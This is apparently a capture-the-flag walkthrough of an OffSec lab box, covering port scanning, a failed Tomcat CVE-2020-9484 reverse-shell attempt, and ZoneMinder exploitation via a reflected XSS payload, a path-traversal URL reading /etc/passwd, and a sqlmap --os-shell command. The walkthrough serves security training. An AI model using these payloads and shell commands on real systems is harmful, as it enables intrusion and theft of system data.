# Filmsy

***
## Not your average pebble in a pond - a pretty pebble.

## Author: OffSec
## Released on: Aug 03, 2020
## Walkthrough: Yes
***


Running our nmap scan we have

```bash
# Nmap 7.94SVN scan initiated Tue Feb 20 12:15:03 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt 192.168.239.52
Nmap scan report for 192.168.239.52
Host is up (0.13s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 aa:cf:5a:93:47:18:0e:7f:3d:6d:a5:af:f8:6a:a5:1e (RSA)
|   256 c7:63:6c:8a:b5:a7:6f:05:bf:d0:e3:90:b5:b8:96:58 (ECDSA)
|_  256 93:b2:6a:11:63:86:1b:5e:f5:89:58:52:89:7f:f3:42 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 7EC7ACEA6BB719ECE5FCE0009B57206B
|_http-title: Pebbles
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
3305/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8080/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-favicon: Apache Tomcat
|_http-title: Tomcat
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb 20 12:17:35 2024 -- 1 IP address (1 host up) scanned in 152.21 seconds
```



Checking the FTP service running on port `21` we currently don't have permissions to connect via anonymous access also no reliable exploit out there



![](https://i.imgur.com/uXTGfJS.png)



Checking port 80/HTTP we have this login page, also viewing page source doesn't seem to give any reliable information


![](https://i.imgur.com/PbqwyR5.png)


![](https://i.imgur.com/6VeTbF2.png)


Checking the port 3305/HTTP we do have a default apache2 web page, seems cool we could run directory bruteforce on this one :P, anyways page-source doesn't contain juicy information also.


![](https://i.imgur.com/jBd4RFR.png)


Running directory bruteforce with `ffuf` looks like we have nothing really to show there



![](https://i.imgur.com/qEwjEui.png)


Checking port 8080/HTTP we do have a tomcat service running on version `9.0`



![](https://i.imgur.com/cp5PuOs.png)



Reading [this](https://github.com/PenTestical/CVE-2020-9484) i was made to understand there is RCE on this version known as `CVE-2020-9484`, let go ahead and see if we can exploit this


Firstly, you need to download and setup `ysoserial`


```bash
cd /opt

sudo git clone https://github.com/frohoff/ysoserial

sudo wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar -O ysoserial-master.jar
```


Then install the script


```bash
git clone https://github.com/PenTestical/CVE-2020-9484 && cd CVE-2020-9484/ ; sudo chmod +x CVE-2020-9484.sh

./CVE-2020-9484.sh --help
```


Then Open the script and replace the IP address as line `13`, with the attacker IP for the reverse shell to work



![](https://i.imgur.com/1VH1YQC.png)



Start up a python server as the script generates a payload to be used in the process of executing our reverse shell


```bash
sudo python3 -m http.server 80
```


Start up your listener also


```bash
nc -nvlp 4444
```


Now run the script with the IP address of the target system you want to attack:


```
./CVE-2020-9484.sh TARGET-IP
```


![](https://i.imgur.com/v02LX1f.png)


Ooops, turns out not to be successful, let enumerate harder :P. Running directory bruteforce on port `80` again with a different word lists, we have a new directory called `/zm`



![](https://i.imgur.com/JoLpYkd.png)



Navigating to the directory on the webpage we have this **Zone Monitor Console** on V1.29.0



![](https://i.imgur.com/Xw2IgGC.png)




Checking for exploits i found this [blog](https://vk9-sec.com/zoneminder-1-291-30-exploitation-multiple-vulnerabilities/) in which all PoC's turned out to be successful, we will look at few though


### **XSS (Reflected)**


Payload -:

```
http://HOST/zm/index.php?view=request&request=log&task=download&key=a9fef1f4&format=texty9fke'<html><head></head><body><script>alert(1)</script></body></html>ayn2h
```


![](https://i.imgur.com/TAmkVIB.png)


### **LFI**

payload


```
http://HOST/zm/index.php?view=file&path=../../../../../../etc/passwd
```



![](https://i.imgur.com/iaUZw5P.png)



### **RCE**



Go ahead and intercept the request of the page with burp suite and save the request to a file as shown below -:


![](https://i.imgur.com/DBUEofV.png)


> Make sure to append `view=request&request=log&task=query&limit=100&minTime=5`


Then go ahead and run `sqlmap` specifying the option that we want a shell



```
❯ sqlmap -r request.txt --dbms mysql --os-shell --data POST
```


Note that this will run for about 10 minutes 😭, Patience!!!, Then you should have a shell


![](https://i.imgur.com/wxRSupR.png)



Running a ping scan we can see our target can truly communicate with us



![](https://i.imgur.com/7BlyjM7.png)

But that is it buddy, yeah that is it, nothing works from here, i have followed walkthroughs for walkthroughs, Nothing works, Normally we are meant to get shell as user `root` from here...



GG



<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>

